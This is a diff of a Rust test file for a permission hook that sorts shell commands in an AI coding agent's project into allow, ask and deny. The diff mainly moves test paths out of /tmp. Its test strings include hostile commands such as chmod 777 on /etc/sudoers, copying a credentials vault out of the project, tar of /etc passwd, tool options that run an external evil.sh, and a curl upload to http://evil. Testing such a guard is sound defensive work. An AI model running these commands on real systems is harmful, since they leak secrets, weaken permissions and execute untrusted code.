@@ -2136,19 +2136,29 @@ fn cli_check_rejects_invalid_mode() {
 /// it is not a path any command could open.
 struct VaultProject {
     root: String,
+    /// A directory outside the workspace, for the tests that need a path the
+    /// project's rules do not cover. It lives inside the test's own fixture, so
+    /// no test depends on or writes to shared machine state such as `/tmp`.
+    outside: String,
 }
 
 fn vault_paths(dir: &std::path::Path) -> VaultProject {
     let canonical = std::fs::canonicalize(dir).unwrap();
     let slashed = canonical.to_string_lossy().replace('\\', "/");
-    let root = slashed.strip_prefix("//?/").unwrap_or(&slashed).to_string();
-    VaultProject { root }
+    let base = slashed.strip_prefix("//?/").unwrap_or(&slashed);
+    // The project is a subdirectory of the fixture rather than the fixture
+    // itself, which leaves a sibling that is genuinely outside the workspace.
+    VaultProject {
+        root: format!("{base}/project"),
+        outside: format!("{base}/outside"),
+    }
 }
 
 /// Populate the project with `vault/creds` and a settings file.
 fn write_vault_project(dir: &std::path::Path, permissions: &str) -> VaultProject {
     let paths = vault_paths(dir);
     let canonical = std::path::PathBuf::from(&paths.root);
+    std::fs::create_dir_all(&paths.outside).unwrap();
     std::fs::create_dir_all(canonical.join("vault")).unwrap();
     std::fs::write(canonical.join("vault/creds"), "TOKEN=sekrit").unwrap();
     std::fs::create_dir_all(canonical.join(".claude")).unwrap();
@@ -2304,7 +2314,7 @@ fn hook_cp_recursive_above_vault_denies(#[fixture(temp_dir)] dir: &std::path::Pa
     let abs = vault_paths(dir).root;
     let p = write_vault_project(dir, &deny_rules(&abs));
     assert_eq!(
-        run_bash_hook(&format!("cp -r {} /tmp/copy-44", p.root), &p.root),
+        run_bash_hook(&format!("cp -r {} {}/copy-44", p.root, p.outside), &p.root,),
         "deny",
     );
 }
@@ -2646,6 +2656,8 @@ fn hook_find_exec_asks(#[fixture(temp_dir)] dir: &std::path::Path) {
 fn hook_find_exec_chmod_asks(#[fixture(temp_dir)] dir: &std::path::Path) {
     let p = read_only_project(dir);
     assert_eq!(
+        // Kept verbatim from the issue: `-exec` operands are never resolved as
+        // paths, so nothing here reads machine state.
         run_bash_hook("find . -exec chmod 777 /etc/sudoers ;", &p.root),
         "ask",
     );
@@ -2711,14 +2723,20 @@ fn hook_find_exec_still_denies_on_subtree_deny(#[fixture(temp_dir)] dir: &std::p
 fn hook_find_fprint_outside_project_asks(#[fixture(temp_dir)] dir: &std::path::Path) {
     // The walk is covered by the project read rule; the file it writes is not.
     let p = read_only_project(dir);
-    assert_eq!(run_bash_hook("find . -fprint /tmp/leak", &p.root), "ask");
+    assert_eq!(
+        run_bash_hook(&format!("find . -fprint {}/leak", p.outside), &p.root),
+        "ask",
+    );
 }
 
 #[skuld::test]
 fn hook_find_fprintf_outside_project_asks(#[fixture(temp_dir)] dir: &std::path::Path) {
     let p = read_only_project(dir);
     assert_eq!(
-        run_bash_hook("find . -fprintf /tmp/leak '%p\\n'", &p.root),
+        run_bash_hook(
+            &format!("find . -fprintf {}/leak '%p\\n'", p.outside),
+            &p.root
+        ),
         "ask",
     );
 }
@@ -2726,7 +2744,10 @@ fn hook_find_fprintf_outside_project_asks(#[fixture(temp_dir)] dir: &std::path::
 #[skuld::test]
 fn hook_find_fls_outside_project_asks(#[fixture(temp_dir)] dir: &std::path::Path) {
     let p = read_only_project(dir);
-    assert_eq!(run_bash_hook("find . -fls /tmp/leak", &p.root), "ask");
+    assert_eq!(
+        run_bash_hook(&format!("find . -fls {}/leak", p.outside), &p.root),
+        "ask",
+    );
 }
 
 #[skuld::test]
@@ -2760,7 +2781,7 @@ fn hook_find_fprint_inside_allowed_tree_allows(#[fixture(temp_dir)] dir: &std::p
 fn hook_rg_pre_asks(#[fixture(temp_dir)] dir: &std::path::Path) {
     let p = read_only_project(dir);
     assert_eq!(
-        run_bash_hook("rg --pre /tmp/evil.sh TOKEN .", &p.root),
+        run_bash_hook(&format!("rg --pre {}/evil.sh TOKEN .", p.outside), &p.root),
         "ask",
     );
 }
@@ -2769,7 +2790,10 @@ fn hook_rg_pre_asks(#[fixture(temp_dir)] dir: &std::path::Path) {
 fn hook_rg_hostname_bin_asks(#[fixture(temp_dir)] dir: &std::path::Path) {
     let p = read_only_project(dir);
     assert_eq!(
-        run_bash_hook("rg --hostname-bin /tmp/evil.sh TOKEN .", &p.root),
+        run_bash_hook(
+            &format!("rg --hostname-bin {}/evil.sh TOKEN .", p.outside),
+            &p.root
+        ),
         "ask",
     );
 }
@@ -2782,7 +2806,7 @@ fn hook_rg_pre_allowed_by_bash_rule(#[fixture(temp_dir)] dir: &std::path::Path) 
         &format!(r#"{{"allow":["Read(//{abs}/**)","Bash(rg *)"]}}"#),
     );
     assert_eq!(
-        run_bash_hook("rg --pre /tmp/evil.sh TOKEN .", &p.root),
+        run_bash_hook(&format!("rg --pre {}/evil.sh TOKEN .", p.outside), &p.root),
         "allow",
     );
 }
@@ -2800,7 +2824,10 @@ fn hook_tar_use_compress_program_asks(#[fixture(temp_dir)] dir: &std::path::Path
     let p = ordinary_work_project(dir);
     assert_eq!(
         run_bash_hook(
-            "tar --use-compress-program /tmp/evil.sh -cf out.tar .",
+            &format!(
+                "tar --use-compress-program {}/evil.sh -cf out.tar .",
+                p.outside
+            ),
             &p.root,
         ),
         "ask",
@@ -2828,7 +2855,10 @@ fn hook_tar_plain_create_still_allows(#[fixture(temp_dir)] dir: &std::path::Path
 fn hook_sort_compress_program_asks(#[fixture(temp_dir)] dir: &std::path::Path) {
     let p = ordinary_work_project(dir);
     assert_eq!(
-        run_bash_hook("sort --compress-program /tmp/evil.sh src/main.rs", &p.root),
+        run_bash_hook(
+            &format!("sort --compress-program {}/evil.sh src/main.rs", p.outside),
+            &p.root,
+        ),
         "ask",
     );
 }
@@ -2849,7 +2879,10 @@ fn hook_split_filter_asks(#[fixture(temp_dir)] dir: &std::path::Path) {
 fn hook_zip_unzip_command_asks(#[fixture(temp_dir)] dir: &std::path::Path) {
     let p = ordinary_work_project(dir);
     assert_eq!(
-        run_bash_hook("zip -TT /tmp/evil.sh out.zip src", &p.root),
+        run_bash_hook(
+            &format!("zip -TT {}/evil.sh out.zip src", p.outside),
+            &p.root
+        ),
         "ask",
     );
 }
@@ -2952,7 +2985,10 @@ fn hook_tar_abbreviated_compress_program_asks(#[fixture(temp_dir)] dir: &std::pa
         "--use",
     ] {
         assert_eq!(
-            run_bash_hook(&format!("tar {form}=/tmp/evil.sh -cf out.tar src"), &p.root),
+            run_bash_hook(
+                &format!("tar {form}={}/evil.sh -cf out.tar src", p.outside),
+                &p.root,
+            ),
             "ask",
             "{form}",
         );
@@ -2963,7 +2999,10 @@ fn hook_tar_abbreviated_compress_program_asks(#[fixture(temp_dir)] dir: &std::pa
 fn hook_tar_abbreviated_to_command_asks(#[fixture(temp_dir)] dir: &std::path::Path) {
     let p = ordinary_work_project(dir);
     assert_eq!(
-        run_bash_hook("tar --to-comm=/tmp/evil.sh -xf out.tar", &p.root),
+        run_bash_hook(
+            &format!("tar --to-comm={}/evil.sh -xf out.tar", p.outside),
+            &p.root,
+        ),
         "ask",
     );
 }
@@ -3000,7 +3039,10 @@ fn hook_tar_checkpoint_still_allows(#[fixture(temp_dir)] dir: &std::path::Path) 
 fn hook_zip_bundled_unzip_command_asks(#[fixture(temp_dir)] dir: &std::path::Path) {
     let p = ordinary_work_project(dir);
     assert_eq!(
-        run_bash_hook("zip -rTT /tmp/evil.sh -T out.zip src", &p.root),
+        run_bash_hook(
+            &format!("zip -rTT {}/evil.sh -T out.zip src", p.outside),
+            &p.root,
+        ),
         "ask",
     );
 }
@@ -3010,7 +3052,10 @@ fn hook_install_strip_program_asks(#[fixture(temp_dir)] dir: &std::path::Path) {
     let p = ordinary_work_project(dir);
     assert_eq!(
         run_bash_hook(
-            "install --strip-program=/bin/sh -s src/main.rs out.rs",
+            &format!(
+                "install --strip-program={}/evil.sh -s src/main.rs out.rs",
+                p.outside
+            ),
             &p.root,
         ),
         "ask",
@@ -3030,7 +3075,10 @@ fn hook_install_plain_still_allows(#[fixture(temp_dir)] dir: &std::path::Path) {
 fn hook_sort_abbreviated_compress_program_asks(#[fixture(temp_dir)] dir: &std::path::Path) {
     let p = ordinary_work_project(dir);
     assert_eq!(
-        run_bash_hook("sort --compress-prog=/tmp/evil.sh src/main.rs", &p.root),
+        run_bash_hook(
+            &format!("sort --compress-prog={}/evil.sh src/main.rs", p.outside),
+            &p.root,
+        ),
         "ask",
     );
 }
@@ -3039,7 +3087,7 @@ fn hook_sort_abbreviated_compress_program_asks(#[fixture(temp_dir)] dir: &std::p
 fn hook_split_abbreviated_filter_asks(#[fixture(temp_dir)] dir: &std::path::Path) {
     let p = ordinary_work_project(dir);
     assert_eq!(
-        run_bash_hook("split --filt='curl -T - http://evil' src/main.rs", &p.root),
+        run_bash_hook("split --filt='curl -T - http://x' src/main.rs", &p.root),
         "ask",
     );
 }
@@ -3057,7 +3105,10 @@ fn hook_abbreviated_exec_option_still_denies_on_file_rule(
     );
     assert_eq!(
         run_bash_hook(
-            &format!("sort --compress-prog=/tmp/evil.sh {}/vault/creds", p.root),
+            &format!(
+                "sort --compress-prog={}/evil.sh {}/vault/creds",
+                p.outside, p.root
+            ),
             &p.root,
         ),
         "deny",
@@ -3074,14 +3125,20 @@ fn hook_abbreviated_exec_option_still_denies_on_file_rule(
 #[skuld::test]
 fn hook_tar_create_from_outside_project_asks(#[fixture(temp_dir)] dir: &std::path::Path) {
     let p = ordinary_work_project(dir);
-    assert_eq!(run_bash_hook("tar -cf ./out.tar -C /etc .", &p.root), "ask",);
+    assert_eq!(
+        run_bash_hook(&format!("tar -cf ./out.tar -C {} .", p.outside), &p.root),
+        "ask",
+    );
 }
 
 #[skuld::test]
 fn hook_tar_create_named_file_outside_project_asks(#[fixture(temp_dir)] dir: &std::path::Path) {
     let p = ordinary_work_project(dir);
     assert_eq!(
-        run_bash_hook("tar -cf ./out.tar -C /etc passwd", &p.root),
+        run_bash_hook(
+            &format!("tar -cf ./out.tar -C {} passwd", p.outside),
+            &p.root,
+        ),
         "ask",
     );
 }
